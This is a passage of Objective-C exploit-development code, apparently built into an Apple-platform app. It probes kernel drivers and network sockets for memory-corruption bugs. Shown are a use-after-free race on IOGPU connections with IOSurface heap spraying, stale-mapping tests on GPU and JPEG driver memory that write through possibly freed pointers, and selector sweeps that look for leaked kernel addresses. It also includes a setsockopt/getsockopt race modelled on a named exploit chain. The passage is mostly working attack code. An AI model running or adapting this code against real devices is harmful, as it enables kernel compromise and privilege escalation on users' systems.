    GetConn_t pGetConn = (GetConn_t)dlsym(iogpu, "IOGPUDeviceGetConnect");
    DevRelease_t pDevRelease = (DevRelease_t)dlsym(iogpu, "IOGPUDeviceRelease");
    QueueCreate_t pQueueCreate = (QueueCreate_t)dlsym(iogpu, "IOGPUCommandQueueCreate");
    QueueGetID_t pGetID = (QueueGetID_t)dlsym(iogpu, "IOGPUCommandQueueGetID");

    // IOSurface for spraying
    typedef IOSurfaceRef (*IOSurfaceCreate_t)(CFDictionaryRef);
    typedef uint32_t (*IOSurfaceGetID_t)(IOSurfaceRef);
    typedef void (*IOSurfaceRelease_t)(IOSurfaceRef);
    void *csf = dlopen("/System/Library/PrivateFrameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (!csf) csf = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    IOSurfaceCreate_t pSurfCreate = csf ? dlsym(csf, "IOSurfaceCreate") : NULL;
    IOSurfaceGetID_t pSurfGetID = csf ? dlsym(csf, "IOSurfaceGetID") : NULL;
    IOSurfaceRelease_t pSurfRelease = csf ? dlsym(csf, "IOSurfaceRelease") : NULL;

    CFMutableDictionaryRef m = pMatching("IOGPU");
    io_service_t svc = m ? pGet(*pMainPort, m) : 0;
    if (!svc) { [out appendString:@"STOP no svc\n"]; return out; }

    // Step 1: Open type=0, set up queue
    void *dev0 = pDevCreate(svc);
    io_connect_t conn0 = dev0 ? pGetConn(dev0) : 0;
    void *args = calloc(1, 0x410);
    *(uint32_t *)((uint8_t *)args + 0x400) = *(uint32_t *)((uint8_t *)dev0 + 0x08);
    *(uint8_t *)((uint8_t *)args + 0x404) = *(uint8_t *)((uint8_t *)dev0 + 0x08);
    void *queue0 = pQueueCreate(dev0, args, 0x410);
    free(args);
    uint32_t qid0 = pGetID ? pGetID(queue0) : 0;

    // Step 2: Open type=1
    io_connect_t conn1 = 0;
    kern_return_t kr = pOpen(svc, mach_task_self(), 1, &conn1);

    [out appendFormat:@"type=0 conn=%u qid=%u | type=1 conn=%u rc=0x%08x\n",
        conn0, qid0, conn1, (unsigned)kr];
    if (!conn0 || !conn1) { [out appendString:@"STOP no conns\n"]; goto done_uaf; }

    // Step 3: Setup state on type=0 — DON'T call sel=8 yet (it only works once)
    {
        uint64_t s[1] = {qid0};
        kern_return_t r2 = pCall(conn0, 16, s, 1, NULL, 0, NULL, NULL, NULL, NULL);
        [out appendFormat:@"setup: sel=16 rc=0x%08x (sel=8 saved for race)\n", (unsigned)r2];
    }

    // Step 4: Close type=1 (frees shared resources)
    kr = pClose(conn1);
    [out appendFormat:@"closed type=1 rc=0x%08x\n", (unsigned)kr];

    // Step 5: Check sel=8 after close (first call — should it succeed or fail?)
    {
        uint64_t s[1] = {qid0};
        kern_return_t r = pCall(conn0, 8, s, 1, NULL, 0, NULL, NULL, NULL, NULL);
        [out appendFormat:@"after close: sel=8 (first call) rc=0x%08x\n", (unsigned)r];
    }

    // Step 7: Spray IOSurfaces to reclaim freed memory
    if (pSurfCreate && pSurfGetID) {
        #define SPRAY_COUNT 200
        IOSurfaceRef surfs[SPRAY_COUNT];
        int surfCreated = 0;
        for (int i = 0; i < SPRAY_COUNT; i++) {
            CFMutableDictionaryRef props = CFDictionaryCreateMutable(NULL, 0, NULL, NULL);
            int w = 64, h = 64;
            CFNumberRef wNum = CFNumberCreate(NULL, kCFNumberIntType, &w);
            CFNumberRef hNum = CFNumberCreate(NULL, kCFNumberIntType, &h);
            int bytesPerElem = 4;
            CFNumberRef bpeNum = CFNumberCreate(NULL, kCFNumberIntType, &bytesPerElem);
            CFStringRef keys[] = { CFSTR("IOSurfaceWidth"), CFSTR("IOSurfaceHeight"), CFSTR("IOSurfaceBytesPerElement") };
            CFTypeRef vals[] = { wNum, hNum, bpeNum };
            CFDictionaryAddValue(props, keys[0], vals[0]);
            CFDictionaryAddValue(props, keys[1], vals[1]);
            CFDictionaryAddValue(props, keys[2], vals[2]);
            surfs[i] = pSurfCreate(props);
            if (surfs[i]) surfCreated++;
            CFRelease(props); CFRelease(wNum); CFRelease(hNum); CFRelease(bpeNum);
        }
        [out appendFormat:@"sprayed %d IOSurfaces\n", surfCreated];

        // Step 8: Check sel=8 after spray
        {
            uint64_t s[1] = {qid0};
            kern_return_t r = pCall(conn0, 8, s, 1, NULL, 0, NULL, NULL, NULL, NULL);
            [out appendFormat:@"after spray: sel=8 rc=0x%08x\n", (unsigned)r];
        }

        // Step 9: Try other selectors after spray
        for (uint32_t sel = 0; sel <= 30; sel++) {
            uint64_t s[1] = {qid0};
            uint64_t outScalars[2] = {0};
            uint32_t outCnt = 2;
            kern_return_t r = pCall(conn0, sel, s, 1, NULL, 0, outScalars, &outCnt, NULL, NULL);
            if (r != 0xe00002c2 && r != 0) {
                [out appendFormat:@"sel=%u rc=0x%08x (INTERESTING!)\n", sel, (unsigned)r];
            } else if (r == 0) {
                [out appendFormat:@"sel=%u rc=0x00000000 (SUCCESS after spray!)\n", sel];
            }
        }

        // Step 10: Cross-conn race — fresh type=0+type=1, race FIRST sel=8 vs close type=1
        // Since sel=8 only works once, we need fresh connections each iteration
        {
            int raceHits = 0, raceErrs = 0, racePanics = 0;
            unsigned raceLastErr = 0;
            for (int iter = 0; iter < 50; iter++) {
                void *devR = pDevCreate(svc);
                io_connect_t connR0 = devR ? pGetConn(devR) : 0;
                io_connect_t connR1 = 0;
                pOpen(svc, mach_task_self(), 1, &connR1);
                if (!connR0 || !connR1) {
                    if (connR0) pClose(connR0);
                    if (devR && pDevRelease) pDevRelease(devR);
                    continue;
                }

                // Set up queue on type=0
                void *aR = calloc(1, 0x410);
                *(uint32_t *)((uint8_t *)aR + 0x400) = *(uint32_t *)((uint8_t *)devR + 0x08);
                *(uint8_t *)((uint8_t *)aR + 0x404) = *(uint8_t *)((uint8_t *)devR + 0x08);
                void *qR = pQueueCreate(devR, aR, 0x410);
                free(aR);
                uint32_t qidR = pGetID ? pGetID(qR) : 0;

                // Race: first sel=8 on type=0 vs close type=1
                __block volatile int go = 0;
                __block kern_return_t callRc = -1;
                __block kern_return_t closeRc = -1;

                dispatch_group_t grp = dispatch_group_create();
                dispatch_queue_t tq = dispatch_queue_create("xuaf.race.t", NULL);
                dispatch_group_async(grp, tq, ^{
                    while (!go) {}
                    uint64_t s[1] = {qidR};
                    callRc = pCall(connR0, 8, s, 1, NULL, 0, NULL, NULL, NULL, NULL);
                });
                dispatch_queue_t cq = dispatch_queue_create("xuaf.race.c", NULL);
                dispatch_group_async(grp, cq, ^{
                    while (!go) {}
                    closeRc = pClose(connR1);
                });
                go = 1;
                dispatch_group_wait(grp, DISPATCH_TIME_FOREVER);

                if (callRc == 0) raceHits++;
                else { raceErrs++; raceLastErr = (unsigned)callRc; }

                // Check if type=0 is still usable
                uint64_t s[1] = {qidR};
                kern_return_t postRc = pCall(connR0, 8, s, 1, NULL, 0, NULL, NULL, NULL, NULL);
                if (postRc == 0 && callRc != 0) {
                    // sel=8 succeeded AFTER the race but not DURING — interesting
                    racePanics++;
                }

                pClose(connR0);
                if (devR && pDevRelease) pDevRelease(devR);
            }
            [out appendFormat:@"\ncross-conn race (50 iters): hits=%d errs=%d lastErr=0x%08x postSuccess=%d\n",
                raceHits, raceErrs, raceLastErr, racePanics];
        }

        // Step 11: sel=42 spray test — call sel=42 many times on type=1, close, spray, reopen
        {
            io_connect_t connS1 = 0;
            pOpen(svc, mach_task_self(), 1, &connS1);
            if (connS1) {
                // Allocate state via sel=42
                int s42hits = 0;
                for (int i = 0; i < 1000; i++) {
                    uint64_t s[1] = {(uint64_t)(i + 1)};
                    kern_return_t r = pCall(connS1, 42, s, 1, NULL, 0, NULL, NULL, NULL, NULL);
                    if (r == 0) s42hits++;
                }
                [out appendFormat:@"sel=42 pre-close: hits=%d/1000\n", s42hits];

                // Close type=1 (frees sel=42 state)
                pClose(connS1);

                // Spray is already active from step 7

                // Open new type=1 and try sel=42
                io_connect_t connS2 = 0;
                pOpen(svc, mach_task_self(), 1, &connS2);
                if (connS2) {
                    int s42post = 0;
                    for (int i = 0; i < 100; i++) {
                        uint64_t s[1] = {(uint64_t)(i + 1)};
                        kern_return_t r = pCall(connS2, 42, s, 1, NULL, 0, NULL, NULL, NULL, NULL);
                        if (r == 0) s42post++;
                    }
                    [out appendFormat:@"sel=42 post-spray: hits=%d/100\n", s42post];
                    pClose(connS2);
                }
            }
        }

        // Cleanup surfs
        if (pSurfRelease) {
            for (int i = 0; i < SPRAY_COUNT; i++) {
                if (surfs[i]) pSurfRelease(surfs[i]);
            }
        }
    } else {
        [out appendString:@"no IOSurface — skipping spray\n"];
    }

done_uaf:
    if (conn0) pClose(conn0);
    if (dev0 && pDevRelease) pDevRelease(dev0);
    pRelease(svc);
    [out appendString:@"\nDONE -- paste this text back\n"];
    return out;
}

// Stale mapping UAF: create shared memory, get pointer, close connection, access stale pointer
+ (NSString *)runP010StaleMapping {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"=== P010 Stale Mapping UAF ===\n\n"];

    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    if (!iokit || !iogpu) { [out appendString:@"STOP dlopen\n"]; return out; }

    IOServiceMatching_t pMatching = dlsym(iokit, "IOServiceMatching");
    IOServiceGetMatchingService_t pGet = dlsym(iokit, "IOServiceGetMatchingService");
    IOServiceOpen_t pOpen = dlsym(iokit, "IOServiceOpen");
    IOServiceClose_t pClose = dlsym(iokit, "IOServiceClose");
    IOObjectRelease_t pRelease = dlsym(iokit, "IOObjectRelease");
    IOConnectCallMethod_t pCall = dlsym(iokit, "IOConnectCallMethod");
    mach_port_t *pMainPort = dlsym(iokit, "kIOMainPortDefault");
    if (!pMainPort) pMainPort = dlsym(iokit, "kIOMasterPortDefault");

    typedef void *(*DevCreate_t)(io_service_t);
    typedef uint32_t (*GetConn_t)(void *);
    typedef void (*DevRelease_t)(void *);
    typedef void *(*QueueCreate_t)(void *, void *, uint32_t);
    typedef uint32_t (*QueueGetID_t)(void *);
    DevCreate_t pDevCreate = (DevCreate_t)dlsym(iogpu, "IOGPUDeviceCreate");
    GetConn_t pGetConn = (GetConn_t)dlsym(iogpu, "IOGPUDeviceGetConnect");
    DevRelease_t pDevRelease = (DevRelease_t)dlsym(iogpu, "IOGPUDeviceRelease");
    QueueCreate_t pQueueCreate = (QueueCreate_t)dlsym(iogpu, "IOGPUCommandQueueCreate");
    QueueGetID_t pGetID = (QueueGetID_t)dlsym(iogpu, "IOGPUCommandQueueGetID");

    // IOGPUDeviceCreateDeviceShmem: calls sel=12 with 2 scalars (type, size), output 16 bytes
    // Signature from disasm: (dev, type, size, arg3, arg4, arg5)
    // We'll call sel=12 directly via pCall
    // IOGPUDeviceGetMemoryData: calls some selector with output 0x30 bytes
    // Signature from disasm: (dev, arg1, arg2, arg3, arg4, arg5, arg6)

    // IOGPUDeviceCreateDeviceShmem and IOGPUDeviceGetMemoryData loaded via dlsym below

    CFMutableDictionaryRef m = pMatching("IOGPU");
    io_service_t svc = m ? pGet(*pMainPort, m) : 0;
    if (!svc) { [out appendString:@"STOP no svc\n"]; return out; }

    void *dev0 = pDevCreate(svc);
    io_connect_t conn0 = dev0 ? pGetConn(dev0) : 0;
    [out appendFormat:@"dev=%p conn=%u\n", dev0, conn0];
    if (!conn0) { [out appendString:@"STOP no conn\n"]; pRelease(svc); return out; }

    // Set up queue
    void *args = calloc(1, 0x410);
    *(uint32_t *)((uint8_t *)args + 0x400) = *(uint32_t *)((uint8_t *)dev0 + 0x08);
    *(uint8_t *)((uint8_t *)args + 0x404) = *(uint8_t *)((uint8_t *)dev0 + 0x08);
    void *queue0 = pQueueCreate(dev0, args, 0x410);
    free(args);
    uint32_t qid0 = pGetID ? pGetID(queue0) : 0;
    [out appendFormat:@"qid=%u\n", qid0];

    // Step 1: Try sel=21 first (memory might already be mapped), then sel=12 with various types
    [out appendString:@"\n--- Step 1: sel=21 (GetMemoryData) + sel=12 (CreateShmem) ---\n"];
    {
        // Try sel=21 first (no input, 0x30 output) — dump even on error
        {
            uint8_t out21[0x30];
            size_t out21Cnt = 0x30;
            kern_return_t r21 = pCall(conn0, 21, NULL, 0, NULL, 0, NULL, NULL, out21, &out21Cnt);
            [out appendFormat:@"sel=21 (no setup): rc=0x%08x outCnt=%zu\n", (unsigned)r21, out21Cnt];
            // Dump all 48 bytes regardless of error
            [out appendString:@"  raw: "];
            for (int i = 0; i < (int)out21Cnt && i < 0x30; i++) {
                [out appendFormat:@"%02x ", out21[i]];
            }
            [out appendString:@"\n"];
            if (out21Cnt >= 16) {
                uint64_t mapAddr = *(uint64_t *)out21;
                uint64_t mapSize = *(uint64_t *)(out21 + 8);
                [out appendFormat:@"  field0=0x%llx field1=0x%llx\n", mapAddr, mapSize];
            }
        }

        // Try sel=12 after sel=8 (submit command first, might enable shmem)
        {
            uint64_t s8[1] = {qid0};
            pCall(conn0, 8, s8, 1, NULL, 0, NULL, NULL, NULL, NULL);
            [out appendString:@"called sel=8 before sel=12\n"];
        }

        // Try sel=12 with various types and sizes, then sel=21
        for (uint32_t type = 0; type <= 40; type++) {
            for (uint32_t sz = 0x1000; sz <= 0x40000; sz *= 4) {
                uint64_t inS[2] = {type, sz};
                uint8_t outS[16];
                size_t outSCnt = 16;
                kern_return_t r = pCall(conn0, 12, inS, 2, NULL, 0, NULL, NULL, outS, &outSCnt);
                if (r == 0) {
                    [out appendFormat:@"sel=12 type=%u sz=0x%x: OK", type, sz];

                    // Now try sel=21 to get memory data
                    uint8_t out21[0x30];
                    size_t out21Cnt = 0x30;
                    kern_return_t r21 = pCall(conn0, 21, NULL, 0, NULL, 0, NULL, NULL, out21, &out21Cnt);
                    if (r21 == 0 && out21Cnt >= 16) {
                        uint64_t mapAddr = *(uint64_t *)out21;
                        uint64_t mapSize = *(uint64_t *)(out21 + 8);
                        [out appendFormat:@" → sel=21 addr=0x%llx size=0x%llx\n", mapAddr, mapSize];

                        if (mapAddr != 0) {
                            volatile uint32_t *p = (volatile uint32_t *)mapAddr;
                            uint32_t val = *p;
                            [out appendFormat:@"  read [0]=0x%08x\n", val];

                            // Close — does mapping become stale?
                            pClose(conn0);
                            conn0 = 0;
                            uint32_t val2 = *p;
                            [out appendFormat:@"  after close: read [0]=0x%08x\n", val2];
                            if (val != val2) {
                                [out appendString:@"  *** STALE MAPPING CONFIRMED! ***\n"];
                            }
                            *p = 0xDEADBEEF;
                            [out appendFormat:@"  write test: 0x%08x\n", *p];
                            goto done_stale;
                        }
                    } else {
                        [out appendFormat:@" sel=21 rc=0x%08x\n", (unsigned)r21];
                    }
                }
            }
        }
        [out appendString:@"no shmem mapping succeeded\n"];
    }

    // Step 2: Try sel=21 without sel=12 (maybe memory is already mapped)
    [out appendString:@"\n--- Step 2: sel=21 without sel=12 ---\n"];
    if (conn0) {
        uint8_t out21[0x30];
        size_t out21Cnt = 0x30;
        kern_return_t r21 = pCall(conn0, 21, NULL, 0, NULL, 0, NULL, NULL, out21, &out21Cnt);
        [out appendFormat:@"sel=21 rc=0x%08x outCnt=%zu\n", (unsigned)r21, out21Cnt];
        [out appendString:@"  raw: "];
        for (int i = 0; i < (int)out21Cnt && i < 0x30; i++) {
            [out appendFormat:@"%02x ", out21[i]];
        }
        [out appendString:@"\n"];
        if (r21 == 0 && out21Cnt >= 16) {
            uint64_t mapAddr = *(uint64_t *)out21;
            uint64_t mapSize = *(uint64_t *)(out21 + 8);
            [out appendFormat:@"  addr=0x%llx size=0x%llx\n", mapAddr, mapSize];
        }
    }

    // Step 3: Sweep more selectors for memory-related ops
    [out appendString:@"\n--- Step 3: selector sweep (looking for memory mappings) ---\n"];
    if (conn0) {
            for (uint32_t sel = 0; sel <= 30; sel++) {
                if (sel == 8 || sel == 12 || sel == 16 || sel == 21) continue; // already tested
                uint8_t outS[0x40];
                size_t outSCnt = 0x40;
                uint64_t outScalars[4];
                uint32_t outScalarCnt = 4;
                kern_return_t r = pCall(conn0, sel, NULL, 0, NULL, 0, outScalars, &outScalarCnt, outS, &outSCnt);
                if (r == 0 && (outSCnt > 0 || outScalarCnt > 0)) {
                    [out appendFormat:@"sel=%u: rc=0 outSCnt=%zu outScalarCnt=%u",
                        sel, outSCnt, outScalarCnt];
                    if (outScalarCnt >= 2) {
                        uint64_t a = outScalars[0];
                        if (a > 0x100000000ULL && a < 0xffffffffffffULL) {
                            [out appendFormat:@"  *** scalar[0]=0x%llx looks like kernel addr! ***", a];
                        }
                    }
                    [out appendString:@"\n"];
                }
            }
        }

done_stale:
    if (conn0) pClose(conn0);
    if (dev0 && pDevRelease) pDevRelease(dev0);
    pRelease(svc);
    [out appendString:@"\nDONE -- paste this text back\n"];
    return out;
}

// P008 JPEG stale mapping: open JPEG, try IOConnectMapMemory64, close, check stale
+ (NSString *)runP008StaleMapping {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"=== P008 JPEG Stale Mapping ===\n\n"];

    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    if (!iokit) { [out appendString:@"STOP dlopen\n"]; return out; }

    IOServiceMatching_t pMatching = dlsym(iokit, "IOServiceMatching");
    IOServiceGetMatchingService_t pGet = dlsym(iokit, "IOServiceGetMatchingService");
    IOServiceOpen_t pOpen = dlsym(iokit, "IOServiceOpen");
    IOServiceClose_t pClose = dlsym(iokit, "IOServiceClose");
    IOObjectRelease_t pRelease = dlsym(iokit, "IOObjectRelease");
    IOConnectCallMethod_t pCall = dlsym(iokit, "IOConnectCallMethod");
    mach_port_t *pMainPort = dlsym(iokit, "kIOMainPortDefault");
    if (!pMainPort) pMainPort = dlsym(iokit, "kIOMasterPortDefault");

    typedef kern_return_t (*IOConnectMapMemory64_t)(io_connect_t, uint32_t, uint64_t *, uint64_t *, kern_return_t *);
    IOConnectMapMemory64_t pMapMem = dlsym(iokit, "IOConnectMapMemory64");

    // Find AppleJPEGDriver
    io_service_t svc = 0;
    {
        io_service_t s1 = pGet(*pMainPort, pMatching("AppleJPEGDriver"));
        if (s1) svc = s1;
    }
    if (!svc) {
        [out appendString:@"no AppleJPEGDriver\nDONE -- paste this text back\n"];
        return out;
    }
    [out appendString:@"found AppleJPEGDriver\n"];

    // Open type=0
    io_connect_t conn = 0;
    kern_return_t kr = pOpen(svc, mach_task_self(), 0, &conn);
    [out appendFormat:@"open rc=0x%08x conn=%u\n", (unsigned)kr, conn];
    if (!conn) { pRelease(svc); return out; }

    // Call sel=0 (OpenJPEG) to open a session
    {
        uint64_t inS[1] = {0};
        kern_return_t r = pCall(conn, 0, inS, 1, NULL, 0, NULL, NULL, NULL, NULL);
        [out appendFormat:@"OpenJPEG (sel=0) rc=0x%08x\n", (unsigned)r];
    }

    // Try IOConnectMapMemory64 with types 0-20
    if (pMapMem) {
        [out appendString:@"\n--- IOConnectMapMemory64 sweep ---\n"];
        for (uint32_t type = 0; type <= 20; type++) {
            uint64_t addr = 0, sz = 0;
            kern_return_t r = pMapMem(conn, type, &addr, &sz, NULL);
            if (r == 0 && addr != 0) {
                [out appendFormat:@"type=%u: addr=0x%llx size=0x%llx\n", type, addr, sz];

                // Read from mapped memory
                volatile uint32_t *p = (volatile uint32_t *)addr;
                uint32_t val = *p;
                [out appendFormat:@"  read [0]=0x%08x\n", val];

                // Close the connection
                pClose(conn);
                conn = 0;

                // Try to read again (stale mapping?)
                uint32_t val2 = *p;
                [out appendFormat:@"  after close: read [0]=0x%08x\n", val2];
                if (val != val2) {
                    [out appendString:@"  *** STALE MAPPING CONFIRMED! ***\n"];
                }
                *p = 0xDEADBEEF;
                [out appendFormat:@"  write test: 0x%08x\n", *p];

                pRelease(svc);
                [out appendString:@"\nDONE -- paste this text back\n"];
                return out;
            }
        }
        [out appendString:@"no mapping succeeded\n"];
    } else {
        [out appendString:@"IOConnectMapMemory64 not available\n"];
    }

    if (conn) pClose(conn);
    pRelease(svc);
    [out appendString:@"\nDONE -- paste this text back\n"];
    return out;
}

// Sweep IOSurfaceRootUserClient + AppleM2ScalerCSCDriver for info leaks
// Based on Coruna/DarkSword technique: IOKit external method info disclosure
+ (NSString *)runIOKitInfoLeak {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"=== IOKit Info Leak Sweep ===\n\n"];

    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    if (!iokit) { [out appendString:@"STOP dlopen\n"]; return out; }

    IOServiceMatching_t pMatching = dlsym(iokit, "IOServiceMatching");
    IOServiceGetMatchingService_t pGet = dlsym(iokit, "IOServiceGetMatchingService");
    IOServiceOpen_t pOpen = dlsym(iokit, "IOServiceOpen");
    IOServiceClose_t pClose = dlsym(iokit, "IOServiceClose");
    IOObjectRelease_t pRelease = dlsym(iokit, "IOObjectRelease");
    IOConnectCallMethod_t pCall = dlsym(iokit, "IOConnectCallMethod");
    mach_port_t *pMainPort = dlsym(iokit, "kIOMainPortDefault");
    if (!pMainPort) pMainPort = dlsym(iokit, "kIOMasterPortDefault");

    const char *services[] = {
        "IOSurfaceRoot",
        "AppleM2ScalerCSCDriver",
        "IOGPU",
        "AppleJPEGDriver",
        NULL
    };

    // Try different input scalar values for each selector
    uint64_t inputVariants[][4] = {
        {0, 0, 0, 0},      // all zeros
        {1, 0, 0, 0},      // first = 1
        {0, 1, 0, 0},      // second = 1
        {1, 1, 0, 0},      // first two = 1
        {0x1000, 0, 0, 0},  // first = page size
    };
    int numVariants = 5;

    for (int si = 0; services[si]; si++) {
        io_service_t svc = pGet(*pMainPort, pMatching(services[si]));
        if (!svc) {
            [out appendFormat:@"[%s] not found\n", services[si]];
            continue;
        }
        [out appendFormat:@"\n[%s] found\n", services[si]];

        // Try opening with different types
        for (uint32_t openType = 0; openType <= 3; openType++) {
            io_connect_t conn = 0;
            kern_return_t kr = pOpen(svc, mach_task_self(), openType, &conn);
            if (kr != 0 || !conn) {
                if (openType == 0) [out appendFormat:@"  open type=%u rc=0x%08x\n", openType, (unsigned)kr];
                continue;
            }
            [out appendFormat:@"  open type=%u conn=%u\n", openType, conn];

            // Phase 1: Find working selectors with NULL output (like previous tests)
            for (uint32_t sel = 0; sel <= 50; sel++) {
                for (int vi = 0; vi < numVariants; vi++) {
                    uint64_t inScalars[4];
                    memcpy(inScalars, inputVariants[vi], 32);
                    uint32_t inCnt = (vi < 2) ? 1 : 2;

                    // Phase 1: NULL output (just check if selector works)
                    kern_return_t r = pCall(conn, sel, inScalars, inCnt, NULL, 0,
                                            NULL, NULL, NULL, NULL);
                    if (r == 0) {
                        // Phase 2: Call again WITH output to capture data
                        uint64_t outScalars[8];
                        uint32_t outScalarCnt = 8;
                        uint8_t outStruct[0x100];
                        size_t outStructCnt = 0x100;

                        kern_return_t r2 = pCall(conn, sel, inScalars, inCnt, NULL, 0,
                                                outScalars, &outScalarCnt, outStruct, &outStructCnt);

                        [out appendFormat:@"  sel=%u in=%llu: OK", sel, inScalars[0]];
                        if (r2 == 0) {
                            [out appendFormat:@" scalars=%u struct=%zu", outScalarCnt, outStructCnt];
                            for (int i = 0; i < (int)outScalarCnt && i < 8; i++) {
                                if (outScalars[i] > 0xffffff8000000000ULL) {
                                    [out appendFormat:@" *** scalar[%d]=0x%llx KERNEL! ***", i, outScalars[i]];
                                }
                            }
                            if (outStructCnt >= 8) {
                                uint64_t *p = (uint64_t *)outStruct;
                                for (int i = 0; i < (int)(outStructCnt / 8) && i < 32; i++) {
                                    if (p[i] > 0xffffff8000000000ULL) {
                                        [out appendFormat:@" *** struct[%d]=0x%llx KERNEL! ***", i, p[i]];
                                    }
                                }
                            }
                            if (outStructCnt > 0 && outStructCnt <= 48) {
                                [out appendString:@"  struct: "];
                                for (int i = 0; i < (int)outStructCnt && i < 48; i++) {
                                    [out appendFormat:@"%02x ", outStruct[i]];
                                }
                            }
                        } else {
                            [out appendFormat:@" (no output, rc2=0x%08x)", (unsigned)r2];
                        }
                        [out appendString:@"\n"];
                        break;
                    }
                }
                // Print first error for debugging (sel 0-5 only)
                if (sel < 6) {
                    uint64_t inS[1] = {0};
                    kern_return_t er = pCall(conn, sel, inS, 1, NULL, 0, NULL, NULL, NULL, NULL);
                    [out appendFormat:@"  sel=%u rc=0x%08x\n", sel, (unsigned)er];
                }
            }

            pClose(conn);
        }
        pRelease(svc);
    }

    [out appendString:@"\nDONE -- paste this text back\n"];
    return out;
}

// ICMPv6 socket exploit exploration (DarkSword Stage 2 technique)
// No IOKit, no MIG — uses network sockets with setsockopt/getsockopt
+ (NSString *)runICMPv6Probe {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"=== ICMPv6 Socket Probe ===\n\n"];

    #ifndef IPPROTO_ICMPV6
    #define IPPROTO_ICMPV6 58
    #endif
    #define IPPROTO_IPV6 41
    #define IPPROTO_TCP 6
    #define IPPROTO_UDP 17
    #ifndef AF_INET6
    #define AF_INET6 30
    #endif

    // Create ICMPv6 socket
    int sock = socket(AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6);
    if (sock < 0) {
        [out appendFormat:@"socket() failed: errno=%d\n", errno];
        [out appendString:@"DONE -- paste this text back\n"];
        return out;
    }
    [out appendFormat:@"sock=%d\n", sock];

    // Try getsockopt with various options to look for info leaks
    [out appendString:@"\n--- getsockopt sweep ---\n"];

    // IPPROTO_ICMPV6 level options
    for (int opt = 0; opt <= 20; opt++) {
        int val = 0;
        socklen_t len = sizeof(val);
        int r = getsockopt(sock, IPPROTO_ICMPV6, opt, &val, &len);
        if (r == 0) {
            [out appendFormat:@"getsockopt ICMPV6 opt=%d: val=%d len=%d\n", opt, val, len];
        }
    }

    // IPPROTO_IPV6 level options
    [out appendString:@"\n--- IPV6 level options ---\n"];
    for (int opt = 0; opt <= 50; opt++) {
        // Try with larger buffer for potential info leaks
        uint8_t buf[4096];
        socklen_t len = sizeof(buf);
        memset(buf, 0, sizeof(buf));
        int r = getsockopt(sock, IPPROTO_IPV6, opt, buf, &len);
        if (r == 0 && len > 0) {
            [out appendFormat:@"getsockopt IPV6 opt=%d: len=%d", opt, len];
            // Check for kernel addresses
            uint64_t *p = (uint64_t *)buf;
            for (int i = 0; i < (int)(len / 8) && i < 512; i++) {
                if (p[i] > 0xffffff8000000000ULL) {
                    [out appendFormat:@" *** [%d]=0x%llx KERNEL ADDR! ***", i, p[i]];
                }
            }
            // Dump if small OR if opt=28 (the interesting one)
            if (len <= 64 || opt == 28) {
                [out appendString:@" data: "];
                int dumpLen = (len < 256) ? (int)len : 256;
                for (int i = 0; i < dumpLen; i++) {
                    [out appendFormat:@"%02x ", buf[i]];
                }
            }
            [out appendString:@"\n"];
        }
    }

    // Try getsockopt with pre-filled buffer to detect kernel writes
    [out appendString:@"\n--- Pattern-fill detection ---\n"];
    {
        uint8_t buf[4096];
        memset(buf, 0xAA, sizeof(buf));
        socklen_t len = sizeof(buf);
        int r = getsockopt(sock, IPPROTO_IPV6, 28, buf, &len);
        [out appendFormat:@"opt=28 pattern-fill: rc=%d len=%d\n", r, len];
        int changed = 0;
        for (int i = 0; i < (int)len && i < 4096; i++) {
            if (buf[i] != 0xAA) { changed++; }
        }
        [out appendFormat:@"  bytes changed by kernel: %d\n", changed];
        if (changed > 0 && changed <= 256) {
            [out appendString:@"  changed data: "];
            for (int i = 0; i < (int)len && i < 256; i++) {
                if (buf[i] != 0xAA) [out appendFormat:@"[%d]=%02x ", i, buf[i]];
            }
            [out appendString:@"\n"];
        }
    }

    // setsockopt + getsockopt race (TOCTOU on socket options)
    [out appendString:@"\n--- setsockopt+getsockopt race (opt=28) ---\n"];
    {
        __block volatile int go = 0;
        __block volatile int setHits = 0;
        __block volatile int getHits = 0;
        __block volatile int dataChanged = 0;

        dispatch_group_t grp = dispatch_group_create();

        // Thread A: setsockopt loop
        dispatch_queue_t sq = dispatch_queue_create("race.set", NULL);
        dispatch_group_async(grp, sq, ^{
            while (!go) {}
            uint8_t setBuf[4096];
            for (int i = 0; i < 100000; i++) {
                memset(setBuf, 0x41, sizeof(setBuf));
                setsockopt(sock, IPPROTO_IPV6, 28, setBuf, sizeof(setBuf));
                setHits++;
            }
        });

        // Thread B: getsockopt loop with pattern buffer
        dispatch_queue_t gq = dispatch_queue_create("race.get", NULL);
        dispatch_group_async(grp, gq, ^{
            while (!go) {}
            uint8_t getBuf[4096];
            for (int i = 0; i < 100000; i++) {
                memset(getBuf, 0xBB, sizeof(getBuf));
                socklen_t len = sizeof(getBuf);
                int r = getsockopt(sock, IPPROTO_IPV6, 28, getBuf, &len);
                if (r == 0) {
                    getHits++;
                    // Check if kernel wrote anything other than our 0xBB pattern
                    for (int j = 0; j < (int)len && j < 4096; j++) {
                        if (getBuf[j] != 0xBB && getBuf[j] != 0x41) {
                            // Found data that's neither our pattern nor the set pattern!
                            dataChanged++;
                            break;
                        }
                    }
                }
            }
        });

        go = 1;
        dispatch_group_wait(grp, DISPATCH_TIME_FOREVER);
        [out appendFormat:@"setHits=%d getHits=%d dataChanged=%d\n",
            setHits, getHits, dataChanged];
        if (dataChanged > 0) {
            [out appendString:@"*** RACE DATA LEAK — kernel wrote unexpected data during set/get race! ***\n"];
        }
    }

    // Try other socket types
    [out appendString:@"\n--- Other socket types ---\n"];
    {
        int tcp = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);
        if (tcp >= 0) {
            [out appendString:@"TCP socket: "];
            for (int opt = 0; opt <= 30; opt++) {
                uint8_t buf[4096];
